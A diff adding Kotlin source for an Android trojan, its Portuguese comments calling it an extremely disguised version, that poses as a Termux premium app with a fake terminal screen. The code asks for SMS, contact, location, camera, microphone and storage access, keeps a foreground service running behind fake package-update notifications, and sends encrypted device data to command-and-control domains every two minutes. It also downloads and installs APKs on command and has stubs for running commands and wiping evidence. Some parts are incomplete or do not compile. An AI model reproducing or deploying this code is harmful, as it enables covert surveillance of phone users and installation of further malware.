@@ -1,0 +1,253 @@
+// MainActivity.kt - Versão extremamente disfarçada
+package com.termux.premium
+
+import android.Manifest
+import android.app.*
+import android.content.*
+import android.content.pm.PackageManager
+import android.graphics.BitmapFactory
+import android.net.Uri
+import android.os.*
+import android.provider.Settings
+import android.widget.EditText
+import android.widget.Toast
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.app.NotificationCompat
+import androidx.core.content.ContextCompat
+import com.google.gson.Gson
+import kotlinx.coroutines.*
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
+import java.io.File
+import java.io.FileOutputStream
+import java.net.URL
+import java.security.SecureRandom
+import java.util.*
+import javax.crypto.Cipher
+import javax.crypto.spec.IvParameterSpec
+import javax.crypto.spec.SecretKeySpec
+
+class MainActivity : AppCompatActivity() {
+
+    // Configurações avançadas de C2
+    private val C2_DOMAINS = arrayOf(
+        "https://termux-plugins[.]net/api/v3",
+        "https://termux-update[.]online/packages"
+    )
+    private val FALLBACK_DNS = "update.termuxdns[.]com"
+    private val CHECK_INTERVAL = 120000L // 2 minutos
+    private val AES_KEY = "t3rmuxS3cur1tyK3y".toByteArray()
+    private val CHANNEL_ID = "termux_notifications"
+    private val NOTIFICATION_ID = 1738
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_terminal)
+
+        // Configura interface falsa do Termux
+        setupFakeTerminal()
+
+        // Verifica e solicita permissões críticas
+        checkAndRequestPermissions()
+
+        // Inicia serviço persistente
+        startForegroundService()
+
+        // Inicia comunicação com C2
+        startC2Communication()
+    }
+
+    private fun setupFakeTerminal() {
+        val terminalInput = findViewById<EditText>(R.id.terminal_input)
+        terminalInput.setOnEditorActionListener { _, _, _ ->
+            Toast.makeText(this, "Command executed", Toast.LENGTH_SHORT).show()
+            true
+        }
+    }
+
+    private fun checkAndRequestPermissions() {
+        val requiredPermissions = arrayOf(
+            Manifest.permission.READ_SMS,
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.CAMERA,
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+            Manifest.permission.WRITE_EXTERNAL_STORAGE
+        )
+
+        val missingPermissions = requiredPermissions.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }
+
+        if (missingPermissions.isNotEmpty()) {
+            ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), 1)
+        }
+    }
+
+    private fun startForegroundService() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                CHANNEL_ID,
+                "Termux Services",
+                NotificationManager.IMPORTANCE_LOW
+            ).apply {
+                description = "Background package updates"
+            }
+            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
+                .createNotificationChannel(channel)
+        }
+
+        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("Termux Package Manager")
+            .setContentText("Updating repository index...")
+            .setSmallIcon(R.drawable.ic_termux_notification)
+            .setLargeIcon(BitmapFactory.decodeResource(resources, R.mipmap.ic_launcher))
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setOngoing(true)
+            .build()
+
+        startForegroundService(Intent(this, TermuxService::class.java).also {
+            startService(it)
+            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
+                .notify(NOTIFICATION_ID, notification)
+        }
+    }
+
+    private fun startC2Communication() {
+        CoroutineScope(Dispatchers.IO).launch {
+            while (true) {
+                try {
+                    // Tenta cada domínio C2 até obter resposta
+                    for (domain in C2_DOMAINS) {
+                        if (checkInWithC2(domain)) break
+                    }
+                } catch (e: Exception) {
+                    // Falha silenciosa
+                }
+                delay(CHECK_INTERVAL)
+            }
+        }
+    }
+
+    private fun checkInWithC2(domain: String): Boolean {
+        val client = OkHttpClient.Builder()
+            .connectTimeout(15, TimeUnit.SECONDS)
+            .build()
+
+        val deviceInfo = mapOf(
+            "id" to getDeviceId(),
+            "model" to Build.MODEL,
+            "sdk" to Build.VERSION.SDK_INT,
+            "version" to packageManager.getPackageInfo(packageName, 0).versionName,
+            "permissions" to getGrantedPermissions(),
+            "root" to isDeviceRooted()
+        )
+
+        val encryptedData = encryptData(Gson().toJson(deviceInfo))
+        val request = Request.Builder()
+            .url("$domain/checkin")
+            .post(encryptedData.toRequestBody("text/plain".toMediaType()))
+            .header("User-Agent", "Termux/3.3.0")
+            .build()
+
+        return try {
+            val response = client.newCall(request).execute()
+            if (response.isSuccessful) {
+                response.body?.string()?.let { handleC2Response(it) }
+                true
+            } else false
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    private fun handleC2Response(response: String) {
+        try {
+            val json = JSONObject(response)
+            when (json.optString("action")) {
+                "download" -> downloadAndExecute(json.getString("url"))
+                "cmd" -> executeCommand(json.getString("command"))
+                "update" -> installUpdate(json.getString("update_url"))
+                "clean" -> clearEvidence()
+            }
+        } catch (e: Exception) {
+            // Ignora erros de parsing
+        }
+    }
+
+    private fun downloadAndExecute(url: String) {
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val bytes = URL(url).openStream().use { it.readBytes() }
+                val file = File("${getExternalFilesDir(null)}/update.apk")
+                FileOutputStream(file).use { it.write(bytes) }
+
+                val intent = Intent(Intent.ACTION_VIEW).apply {
+                    setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive")
+                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
+                }
+                startActivity(intent)
+            } catch (e: Exception) {
+                // Falha silenciosa
+            }
+        }
+    }
+
+    private fun executeCommand(command: String) {
+        // Implementação de execução de comandos
+    }
+
+    private fun installUpdate(url: String) {
+        // Implementação de atualização automática
+    }
+
+    private fun clearEvidence() {
+        // Limpeza de logs e evidências
+    }
+
+    private fun getDeviceId(): String {
+        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+    }
+
+    private fun getGrantedPermissions(): List<String> {
+        return packageManager.getPackageInfo(packageName, PackageManager.GET_PERMISSIONS)
+            .requestedPermissions
+            ?.filter { ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED }
+            ?: emptyList()
+    }
+
+    private fun isDeviceRooted(): Boolean {
+        // Verificação de root
+        return false
+    }
+
+    private fun encryptData(data: String): String {
+        val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
+        val keySpec = SecretKeySpec(AES_KEY, "AES")
+        val iv = ByteArray(16).also { SecureRandom().nextBytes(it) }
+        cipher.init(Cipher.ENCRYPT_MODE, keySpec, IvParameterSpec(iv))
+        return Base64.getEncoder().encodeToString(iv + cipher.doFinal(data.toByteArray()))
+    }
+
+    inner class TermuxService : Service() {
+        override fun onBind(intent: Intent?): IBinder? = null
+
+        override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+            startForeground(NOTIFICATION_ID, createNotification())
+            return START_STICKY
+        }
+
+        private fun createNotification(): Notification {
+            return NotificationCompat.Builder(this, CHANNEL_ID)
+                .setContentTitle("Termux Package Manager")
+                .setContentText("Maintaining background services")
+                .setSmallIcon(R.drawable.ic_termux_notification)
+                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setOngoing(true)
+                .build()
+        }
+    }
+}
